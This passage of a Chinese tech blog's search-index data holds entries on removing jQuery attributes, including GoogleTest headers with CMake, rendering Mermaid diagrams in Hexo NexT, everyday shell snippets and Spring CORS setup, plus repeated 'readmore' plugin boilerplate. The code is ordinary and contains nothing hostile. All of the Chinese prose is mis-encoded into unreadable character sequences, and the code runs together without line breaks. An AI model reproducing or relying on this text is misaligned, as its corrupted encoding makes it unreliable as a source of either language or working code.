}); var img = $(this); $.each(attributes, function(i, item) { img.removeAttr(item); }); });} ä¾‹å¦‚åˆ é™¤ &lt;img&gt; èŠ‚ç‚¹çš„æ‰€æœ‰å±æ€§ï¼Œä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š 1$("img").removeAttributes(); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"C++ å¼€å‘éšç¬”",url:"/posts/4ca3ab6c.html",text:'æ„å»ºå·¥å…·CMake æ— æ³•å¼•å…¥ç¬¬ä¸‰æ–¹åº“çš„å¤´æ–‡ä»¶è¿™é‡Œä»¥ GoogleTest åº“ä¸ºä¾‹å­ï¼Œè®²è¿° CMake ä¸ºä»€ä¹ˆæ— æ³•æ­£å¸¸å¼•å…¥é¡¹ç›®é‡Œçš„ç¬¬ä¸‰æ–¹åº“çš„å¤´æ–‡ä»¶ï¼Œå…¶ä¸­ GoogleTest åº“åœ¨é¡¹ç›®é‡Œçš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869minderâ”œâ”€â”€ CMakeLists.txtâ”œâ”€â”€ includeâ”œâ”€â”€ srcâ””â”€â”€ thirdparty â””â”€â”€ googletest â”œâ”€â”€ gmock â”‚ â”œâ”€â”€ include â”‚ â”‚ â””â”€â”€ gmock â”‚ â”‚ â”œâ”€â”€ gmock-actions.h â”‚ â”‚ â”œâ”€â”€ gmock-cardinalities.h â”‚ â”‚ â”œâ”€â”€ gmock-function-mocker.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h.pump â”‚ â”‚ â”œâ”€â”€ gmock-generated-function-mockers.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-function-mockers.h.pump â”‚ â”‚ â”œâ”€â”€ gmock-generated-matchers.h â”‚ â”‚ â”œâ”€â”€ gmock-generated-matchers.h.pump â”‚ â”‚ â”œâ”€â”€ gmock.h â”‚ â”‚ â”œâ”€â”€ gmock-matchers.h â”‚ â”‚ â”œâ”€â”€ gmock-more-actions.h â”‚ â”‚ â”œâ”€â”€ gmock-more-matchers.h â”‚ â”‚ â”œâ”€â”€ gmock-nice-strict.h â”‚ â”‚ â”œâ”€â”€ gmock-spec-builders.h â”‚ â”‚ â””â”€â”€ internal â”‚ â”‚ â”œâ”€â”€ custom â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-generated-actions.h.pump â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-matchers.h â”‚ â”‚ â”‚ â”œâ”€â”€ gmock-port.h â”‚ â”‚ â”‚ â””â”€â”€ README.md â”‚ â”‚ â”œâ”€â”€ gmock-internal-utils.h â”‚ â”‚ â”œâ”€â”€ gmock-port.h â”‚ â”‚ â””â”€â”€ gmock-pp.h â”‚ â””â”€â”€ lib â”‚ â”œâ”€â”€ libgmock_main.so â”‚ â””â”€â”€ libgmock.so â””â”€â”€ gtest â”œâ”€â”€ include â”‚ â””â”€â”€ gtest â”‚ â”œâ”€â”€ gtest-death-test.h â”‚ â”œâ”€â”€ gtest.h â”‚ â”œâ”€â”€ gtest-matchers.h â”‚ â”œâ”€â”€ gtest-message.h â”‚ â”œâ”€â”€ gtest-param-test.h â”‚ â”œâ”€â”€ gtest_pred_impl.h â”‚ â”œâ”€â”€ gtest-printers.h â”‚ â”œâ”€â”€ gtest_prod.h â”‚ â”œâ”€â”€ gtest-spi.h â”‚ â”œâ”€â”€ gtest-test-part.h â”‚ â”œâ”€â”€ gtest-typed-test.h â”‚ â””â”€â”€ internal â”‚ â”œâ”€â”€ custom â”‚ â”‚ â”œâ”€â”€ gtest.h â”‚ â”‚ â”œâ”€â”€ gtest-port.h â”‚ â”‚ â”œâ”€â”€ gtest-printers.h â”‚ â”‚ â””â”€â”€ README.md â”‚ â”œâ”€â”€ gtest-death-test-internal.h â”‚ â”œâ”€â”€ gtest-filepath.h â”‚ â”œâ”€â”€ gtest-internal.h â”‚ â”œâ”€â”€ gtest-param-util.h â”‚ â”œâ”€â”€ gtest-port-arch.h â”‚ â”œâ”€â”€ gtest-port.h â”‚ â”œâ”€â”€ gtest-string.h â”‚ â”œâ”€â”€ gtest-type-util.h â”‚ â””â”€â”€ gtest-type-util.h.pump â””â”€â”€ lib â”œâ”€â”€ libgtest_main.so â””â”€â”€ libgtest.so ç‰¹åˆ«æ³¨æ„ åœ¨ä¸Šé¢çš„é¡¹ç›®ç»“æ„ä¸­ï¼Œgtest çš„å¤´æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æ˜¯ thirdparty/googletest/gtest/include/gtest/ï¼Œè€Œä¸æ˜¯ thirdparty/googletest/gtest/include/ã€‚å› æ­¤åœ¨ C++ æºæ–‡ä»¶ä¸­å¼•å…¥ gtest å¤´æ–‡ä»¶çš„æ­£ç¡®å†™æ³•æ˜¯ #include &lt;gtest/gtest.h&gt;ï¼Œå³å¤´æ–‡ä»¶çš„è·¯å¾„æ˜¯ include ç›®å½•ä¸‹çš„ gtest/gtest.hã€‚è¿™ä¸€ç‚¹å¿…é¡»æ³¨æ„ï¼Œå¦åˆ™ä¼šç»å¸¸å¯¼è‡´ CMake æ— æ³•æ­£å¸¸å¼•å…¥ç¬¬ä¸‰æ–¹åº“çš„å¤´æ–‡ä»¶ã€‚ç®€å•ä¸€å¥è¯æ¦‚å†µï¼Œå¦‚æœåœ¨ C++ æºæ–‡ä»¶ä¸­ï¼Œå¤´æ–‡ä»¶çš„å¼•å…¥æ–¹å¼æ˜¯ #include &lt;gtest/gtest.h&gt;ï¼Œé‚£ä¹ˆåœ¨é¡¹ç›®é‡Œçš„ç¬¬ä¸‰æ–¹åº“çš„ include ç›®å½•ä¸‹å¿…ç„¶è¦æœ‰ä¸€ä¸ª gtest å­ç›®å½•ã€‚ C++ çš„ç¤ºä¾‹ä»£ç  1234567891011121314#include &lt;iostream&gt;#include &lt;gtest/gtest.h&gt;using namespace std;TEST( COutputPopLimitStrategyTest, PositiveNos ){ EXPECT_EQ(true, true);}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} CMake çš„ç¤ºä¾‹é…ç½® 123456789101112131415# å®šä¹‰ GoogleTest åº“çš„ç›®å½•è·¯å¾„set(PATH_TO_GOOGLE_TEST thirdparty/googletest/gtest)set(PATH_TO_GOOGLE_MOCK thirdparty/googletest/gmock)# å¼•å…¥ GoogleTest åº“çš„å¤´æ–‡ä»¶include_directories(${PATH_TO_GOOGLE_TEST}/include ${PATH_TO_GOOGLE_MOCK}/include)# æŒ‡å®š GoogleTest åŠ¨æ€é“¾æ¥åº“æ‰€åœ¨çš„ç›®å½•link_directories(${PATH_TO_GOOGLE_TEST}/lib ${PATH_TO_GOOGLE_MOCK}/lib)# æŒ‡å®šç¼–è¯‘å‚æ•°set(CMAKE_CXX_FLAGS "-lpthread")# é“¾æ¥ GoogleTest çš„åŠ¨æ€é“¾æ¥åº“target_link_libraries(${PROJECT_NAME} gtest_main.so gtest.so gmock_main.so gmock.so) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ å¼€å‘éšç¬”"},{title:"Hexo NexT ä¸»é¢˜æ¸²æŸ“ Mermaid ç»˜å›¾",url:"/posts/e6e0cad5.html",text:'ç‰ˆæœ¬è¯´æ˜ Hexo 5.4.0 NexT 8.8.1 NexT æ¸²æŸ“ Mermaid ç»˜å›¾å®‰è£… Hexo æ’ä»¶åœ¨åšå®¢çš„æ ¹ç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… hexo-filter-mermaid-diagrams æ’ä»¶ 1$ npm install hexo-filter-mermaid-diagrams --save NexT å¯ç”¨ Mermaidæ‰“å¼€ NexT ä¸»é¢˜çš„ _config.yml é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ° mermaid çš„é…ç½®é¡¹ï¼Œå¹¶è®¾ç½® enable: trueï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567# Mermaid tagmermaid: enable: true # Available themes: default | dark | forest | neutral theme: light: default dark: dark Hexo é‡æ–°ç¼–è¯‘æ„å»ºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œé‡æ–°æ‰§è¡Œ Hexo çš„ç¼–è¯‘æ„å»ºæ“ä½œï¼Œå¹¶å¯åŠ¨ Hexo-Server çš„é¢„è§ˆæœåŠ¡ï¼Œè‹¥ Mermaid çš„ç»˜å›¾æ­£å¸¸æ˜¾ç¤ºï¼Œåˆ™è¯´æ˜ Mermaid æˆåŠŸè¢«æ¸²æŸ“ã€‚ 1$ hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server Hexo æ’ä»¶çš„ä½¿ç”¨Hexo æ’ä»¶ hexo-filter-mermaid-diagrams çš„å®˜æ–¹æ–‡æ¡£è¯´æ˜å¯ä»¥çœ‹è¿™é‡Œã€‚ è¯­æ³•è¯´æ˜å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæœ‰ä¸€äº› Markdown çš„ç¼–è¾‘å·¥å…·ï¼Œæ¯”å¦‚åœ¨ Cmd Markdown é‡Œï¼ŒMermaid çš„ä½¿ç”¨è¯­æ³•æ˜¯è¿™æ ·çš„ï¼š ä½† hexo-filter-mermaid-diagrams è¿™æ¬¾æ’ä»¶çš„ä½¿ç”¨è¯­æ³•ç•¥æœ‰ä¸åŒï¼š sequenceã€graph TD ç­‰ Mermaid Diagram çš„å…·ä½“ç±»å‹å¿…é¡»å†™åœ¨ç¬¬ä¸€è¡Œçš„å†…å®¹é‡Œ ä¸‰ä¸ªç‚¹åé¢è¦å†™çš„æ˜¯ mermaidï¼Œè€Œä¸æ˜¯ sequenceã€graph TD ç­‰ Mermaid Diagram çš„å…·ä½“ç±»å‹ ä½¿ç”¨ç¤ºä¾‹æµç¨‹å›¾1234567graph TB id1(åœ†è§’çŸ©å½¢)--æ™®é€šçº¿--&gt;id2[çŸ©å½¢]; subgraph å­å›¾ id2==ç²—çº¿==&gt;id3{è±å½¢} id3-.è™šçº¿.-&gt;id4&gt;å³å‘æ——å¸œ] id3--æ— ç®­å¤´---id5((åœ†å½¢)) end graph TB id1(åœ†è§’çŸ©å½¢)--æ™®é€šçº¿--&gt;id2[çŸ©å½¢]; subgraph å­å›¾ id2==ç²—çº¿==&gt;id3{è±å½¢} id3-.è™šçº¿.-&gt;id4&gt;å³å‘æ——å¸œ] id3--æ— ç®­å¤´---id5((åœ†å½¢)) end æ—¶åºå›¾12345678910sequenceDiagramAlice-&gt;&gt;John: Hello John, how are you?loop Healthcheck John-&gt;&gt;John: Fight against hypochondriaendNote right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good! sequenceDiagram Alice-&gt;&gt;John: Hello John, how are you? loop Healthcheck John-&gt;&gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good! ç”˜ç‰¹å›¾12345678ganttsection Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d gantt section Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d é¥¼å›¾123456pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5 pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5 ç±»åˆ«å›¾123456789101112131415161718192021classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } çŠ¶æ€å›¾12345678910111213141516stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed } stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed } å®ä½“å…³ç³»å›¾1234erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses å‚è€ƒèµ„æ–™ mermaid-js å®˜æ–¹æ–‡æ¡£ hexo-filter-mermaid-diagrams æ’ä»¶çš„å®˜æ–¹æ–‡æ¡£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Shell ç¼–ç¨‹å¸¸ç”¨ä»£ç å—ä¹‹ä¸€",url:"/posts/d9ceba01.html",text:'æ—¥å¿—å®šä¹‰æ—¥å¿—çš„é¢œè‰²123456789101112131415161718192021222324252627282930313233#!/bin/bash_COLORS=${BS_COLORS:-$(tput colors 2&gt;/dev/null || echo 0)}__detect_color_support() { if [ $? -eq 0 ] &amp;&amp; [ "$_COLORS" -gt 2 ]; then RC=\'\\033[1;31m\' GC=\'\\033[1;32m\' BC=\'\\033[1;34m\' YC=\'\\033[1;33m\' EC=\'\\033[0m\' else RC="" GC="" BC="" YC="" EC="" fi}__detect_color_supportechoerror() { printf "${RC} * ERROR${EC}: %s\\\\n" "$@" 1&gt;&amp;2;}echoinfo() { printf "${GC} * INFO${EC}: %s\\\\n" "$@";}echowarn() { printf "${YC} * WARN${EC}: %s\\\\n" "$@";}# ä½¿ç”¨ç¤ºä¾‹echoinfo "Hello World"echowarn "Hello World"echoerror "Hello World" å¸¸è§çš„æ¡ä»¶åˆ¤æ–­åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨123456789#!/bin/bashLOGS_PATH="/tmp/logs/blog"if [ ! -d "$LOGS_PATH" ]; then echo "ç›®å½•ä¸å­˜åœ¨"else echo "ç›®å½•å·²å­˜åœ¨"fi åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹1234567891011#!/bin/bash_OS_LINUX="Linux"_OS_INFO=`uname -a`if [[ $_OS_INFO =~ $_OS_LINUX ]]then echo "Linux æ“ä½œç³»ç»Ÿ"else echo "é Linux æ“ä½œç³»ç»Ÿ"fi åˆ¤æ–­æ˜¯å¦ä¸º Root ç”¨æˆ·12345#!/bin/bashif [ $UID -ne 0 ]; then echo "é Root ç”¨æˆ·!"fi æ‰§è¡Œè„šæœ¬æ‰§è¡ŒæŒ‡å®šçš„ Shell è„šæœ¬æ–‡ä»¶ä½¿ç”¨ Linux å‘½ä»¤ï¼Œæ‰§è¡ŒæŒ‡å®šçš„ Shell è„šæœ¬æ–‡ä»¶ 1sh date.sh æ‰§è¡ŒæŒ‡å®šçš„ Shell è„šæœ¬å†…å®¹ä½¿ç”¨ Linux å‘½ä»¤ï¼Œæ‰§è¡ŒæŒ‡å®šçš„ Shell è„šæœ¬å†…å®¹ 1sh -c "echo ç°åœ¨çš„æ—¶é—´ï¼š`date \'+%Y-%m-%d %H:%M:%S\'`" è·å– Linux å‘½ä»¤çš„æ‰§è¡Œç»“æœ1234#!/bin/bashdate_str=$(date)echo $date_str æ‰§è¡Œå­—ç¬¦ä¸²é‡Œçš„ Shell è„šæœ¬å†…å®¹1234#!/bin/bashUPDATE_SYSTEM_DYNAMIC_LIBS=0echo "### æ˜¯å¦æ›´æ–°ç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“: `[[ $UPDATE_SYSTEM_DYNAMIC_LIBS -eq 1 ]] &amp;&amp; echo \'æ˜¯\' || echo \'å¦\'`" ç¨‹åºè¿è¡ŒçŠ¶æ€è·å–åº”ç”¨çš„è¿›ç¨‹æ•°12345678#!/bin/bash# åº”ç”¨çš„åç§°program_name="dockerd"# ç²¾ç¡®ç»Ÿè®¡åº”ç”¨æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ•°é‡count=`ps -aux | grep -w "$program_name" | grep -v grep | wc -l`echo $count è·å–åº”ç”¨çš„è¿›ç¨‹ ID12345678910111213141516#!/bin/bash# åº”ç”¨çš„åç§°program_name="dockerd"# ç²¾ç¡®è·å–åº”ç”¨æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹IDï¼ˆåº”ç”¨åŒæ—¶è¿è¡Œäº†å¤šä¸ªå®ä¾‹æ—¶ï¼Œä¼šæœ‰å¤šä¸ªå€¼ï¼Œè¿”å›æ•°ç»„ï¼‰process_ids=`ps -aux | grep -w "$program_name" | grep -v grep | awk \'{print $2}\'`# åˆ¤æ–­è¿›ç¨‹IDæ˜¯å¦ä¸ºç©ºif [ ! -n "$process_ids" ]; then echo "$program_name æ²¡æœ‰è¿è¡Œ"else # æ•°ç»„è½¬å­—ç¬¦ä¸² process_ids_str=`echo $process_ids` echo "$program_name å·²ç»æœ‰å®ä¾‹æ­£åœ¨è¿è¡Œï¼ŒPID æ˜¯ ${process_ids_str/ /, }" fi æ—¥æœŸå¤„ç†åˆ¤æ–­æ˜¯å¦ä¸ºå‘¨æœ«1234567#!/bin/bashif [[ $(date +%u) -gt 5 ]]; then echo "ä»Šå¤©æ˜¯å‘¨æœ«"else echo "ä»Šå¤©ä¸æ˜¯å‘¨æœ«"fi åˆ¤æ–­ä»Šå¤©æ˜¯æ˜ŸæœŸå‡ 12345#!/bin/bash# å€¼çš„èŒƒå›´æ˜¯1 ~ 7ï¼Œå…¶ä¸­ 1 è¡¨ç¤ºæ˜ŸæœŸä¸€DOW=$(date +%u)echo $DOW æ–‡ä»¶å¤„ç†è¯»å– ini é…ç½®æ–‡ä»¶æç¤º ini é…ç½®æ–‡ä»¶çš„æ ¼å¼ä»‹ç»ï¼Œå¯ä»¥å‚è€ƒè¿™é‡Œ ini é…ç½®æ–‡ä»¶çš„åç¼€åä¸ä¸€å®šå¿…é¡»æ˜¯ .iniï¼Œä¹Ÿå¯ä»¥æ˜¯ .cfgã€.conf æˆ–è€…æ˜¯ .txtã€‚ config.ini é…ç½®æ–‡ä»¶çš„å†…å®¹ 12345[Server1]ip = 127.0.0.1[Server2]ip = 192.168.1.1 example.sh è„šæœ¬çš„å†…å®¹ 1234567891011function __readINI() { INIFILE=$1; SECTION=$2; ITEM=$3 _readContent=`awk -F \'=\' \'/\\[\'$SECTION\'\\]/{a=1}a==1&amp;&amp;$1~/\'$ITEM\'/{print $2;exit}\' $INIFILE` echo ${_readContent}}_IP1=( $( __readINI config.ini Server1 ip ) )_IP2=( $( __readINI config.ini Server2 ip ) )echo ${_IP1}echo ${_IP2} è„šæœ¬æ‰§è¡Œåè¾“å‡ºçš„ç»“æœ 12127.0.0.1192.168.1.1 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linuxç³»ç»Ÿç¼–ç¨‹ ä»£ç å—"},{title:"Spring ä¸ SpringBoot é…ç½®è·¨åŸŸçš„å‡ ç§æ–¹å¼",url:"/posts/3a3d508.html",text:'å‰è¨€ ä»€ä¹ˆæ˜¯è·¨åŸŸï¼šæµè§ˆå™¨ä»ä¸€ä¸ªåŸŸåçš„ç½‘é¡µå»è¯·æ±‚å¦ä¸€ä¸ªåŸŸåçš„èµ„æºæ—¶ï¼ŒåŸŸåã€ç«¯å£ã€åè®®ä»»ä¸€é¡¹ä¸åŒï¼Œéƒ½å±äºè·¨åŸŸ é€ æˆçš„åŸå› ï¼šç”±äºæµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼Œå³ A ç½‘ç«™åªèƒ½è®¿é—® A ç½‘ç«™çš„å†…å®¹ï¼Œä¸èƒ½è®¿é—® B ç½‘ç«™çš„å†…å®¹ ç‰¹åˆ«æ³¨æ„ï¼šè·¨åŸŸé—®é¢˜åªå­˜åœ¨äºæµè§ˆå™¨ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å‰ç«¯é¡µé¢è®¿é—®åç«¯çš„æ¥å£æ—¶ï¼Œè¿”å›å€¼æ˜¯æœ‰çš„ï¼Œåªæ˜¯æœåŠ¡å™¨æ²¡æœ‰åœ¨è¯·æ±‚å¤´æŒ‡å®šè·¨åŸŸçš„ä¿¡æ¯ï¼Œæ‰€ä»¥æµè§ˆå™¨è‡ªåŠ¨æŠŠè¿”å›å€¼ç»™â€ å±è”½äº†â€ è§£å†³è·¨åŸŸï¼šç»è¿‡ä¸Šé¢çš„äº†è§£ï¼Œå¯ä»¥å¾—å‡ºå‡ ä¸ªè§£å†³è·¨åŸŸçš„æ–¹æ³•ï¼ˆè¿™é‡Œæš‚ä¸è€ƒè™‘å‰ç«¯çš„å®ç°æ–¹æ¡ˆï¼‰ï¼Œä¸€æ˜¯æœåŠ¡ç«¯æŒ‡å®šè·¨åŸŸä¿¡æ¯ï¼ŒäºŒæ˜¯åœ¨ Web é¡µé¢ä¸åç«¯æœåŠ¡ä¹‹é—´åŠ ä¸€å±‚æœåŠ¡æ¥æŒ‡å®šè·¨åŸŸä¿¡æ¯ï¼Œæ¯”å¦‚ä»£ç†æœåŠ¡ Nginx Spring é…ç½®è·¨åŸŸä½¿ç”¨æ³¨è§£å®ç°è·¨åŸŸ ç‰¹åˆ«æ³¨æ„ï¼šSpring çš„ç‰ˆæœ¬è¦åœ¨ 4.2 æˆ–ä»¥ä¸Šç‰ˆæœ¬æ‰æ”¯æŒä½¿ç”¨ @CrossOrigin æ³¨è§£æ¥æ§åˆ¶è·¨åŸŸï¼Œä½¿ç”¨æ³¨è§£çš„æ–¹å¼ä¼˜åŠ¿åœ¨äºæ¯”è¾ƒå®¹æ˜“ç»†ç²’åº¦ï¼ˆå±€éƒ¨ï¼‰åœ°å®ç°è·¨åŸŸæ§åˆ¶ åœ¨ Controller ç±»ä¸­é…ç½®è·¨åŸŸï¼Œå¯ä»¥ä½¿ç”¨æ³¨è§£ @CrossOriginï¼Œè¯¥æ³¨è§£æ”¯æŒå†™åœ¨ç±»æˆ–è€…æ–¹æ³•ä¸Šï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011@RestController@RequestMapping("/account")public class AccountController { @CrossOrigin @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} æˆ–è€… 1234567891011121314import org.springframework.web.bind.annotation.*;import static org.springframework.web.bind.annotation.RequestMethod.*;@RestController@RequestMapping("/account")@CrossOrigin(origins = {"http://example.com"}, maxAge = 3600, allowedHeaders = {"Origin", "X-Requested-With", "Content-Type", "Accept", "token"}, methods = {GET, POST, PUT, OPTIONS, DELETE, PATCH})public class AccountController { @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} @CrossOrigin æ³¨è§£ä¸­çš„å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š originsï¼šå…è®¸æ¥æºåŸŸåçš„åˆ—è¡¨ï¼Œä¸è®¾ç½®ç¡®åˆ‡å€¼æ—¶é»˜è®¤æ”¯æŒæ‰€æœ‰åŸŸåè·¨åŸŸè®¿é—® methods: è·¨åŸŸè¯·æ±‚ä¸­æ”¯æŒçš„ HTTP è¯·æ±‚çš„ç±»å‹ï¼ˆGETã€POSTã€DELETE â€¦ï¼‰ï¼Œä¸æŒ‡å®šç¡®åˆ‡å€¼æ—¶é»˜è®¤ä¸ Controller æ–¹æ³•ä¸­çš„ methods å­—æ®µä¿æŒä¸€è‡´ maxAgeï¼šè·¨åŸŸé¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼ˆå•ä½ä¸ºç§’ï¼‰ï¼Œç›®çš„æ˜¯å‡å°‘æµè§ˆå™¨é¢„æ£€ / å“åº”çš„è¯·æ±‚æ•°é‡ï¼Œé»˜è®¤å€¼æ˜¯ 1800ç§’ï¼›è®¾ç½®äº†è¯¥å€¼åï¼Œæµè§ˆå™¨å°†åœ¨è®¾ç½®å€¼çš„æ—¶é—´æ®µå†…å¯¹è¯¥è·¨åŸŸè¯·æ±‚ä¸å†å‘èµ·é¢„æ£€è¯·æ±‚ exposedHeadersï¼šè·¨åŸŸè¯·æ±‚çš„è¯·æ±‚å¤´ä¸­å…è®¸æºå¸¦é™¤ Cache-Controllerã€Content-Languageã€Content-Typeã€Expiresã€Last-Modifiedã€Pragma è¿™å…­ä¸ªåŸºæœ¬å­—æ®µä¹‹å¤–çš„å…¶ä»–å­—æ®µä¿¡æ¯ allowedHeadersï¼šå…è®¸çš„è¯·æ±‚å¤´ä¸­çš„å­—æ®µç±»å‹ï¼Œä¸è®¾ç½®ç¡®åˆ‡å€¼æ—¶é»˜è®¤æ”¯æŒæ‰€æœ‰çš„ Header å­—æ®µï¼ˆCache-Controllerã€Content-Languageã€Content-Typeã€Expiresã€Last-Modifiedã€Pragmaï¼‰è·¨åŸŸè®¿é—® allowCredentialsï¼šæµè§ˆå™¨æ˜¯å¦å°†æœ¬åŸŸåä¸‹çš„ Cookie ä¿¡æ¯æºå¸¦è‡³è·¨åŸŸæœåŠ¡å™¨ä¸­ï¼Œè‹¥è®¾ç½®ä¸ºæºå¸¦ Cookie è‡³è·¨åŸŸæœåŠ¡å™¨ä¸­ï¼Œè¦å®ç° Cookie å…±äº«è¿˜éœ€è¦å‰ç«¯åœ¨ AJAX è¯·æ±‚ä¸­æ‰“å¼€ withCredentials å±æ€§ SpringMVC è¿˜æ”¯æŒåŒæ—¶ä½¿ç”¨ç±»å’Œæ–¹æ³•çº§åˆ«çš„è·¨åŸŸé…ç½®ï¼Œæ­¤æ—¶ SpringMVC ä¼šåˆå¹¶ä¸¤ä¸ªæ³¨è§£å±æ€§ä»¥åˆ›å»ºåˆå¹¶åçš„è·¨åŸŸé…ç½® 123456789101112@RestController@RequestMapping("/account")@CrossOrigin(maxAge = 3600)public class AccountController { @CrossOrigin(origins = {"http://example.com"}) @GetMapping("/{id}") public Account retrieve(@PathVariable Long 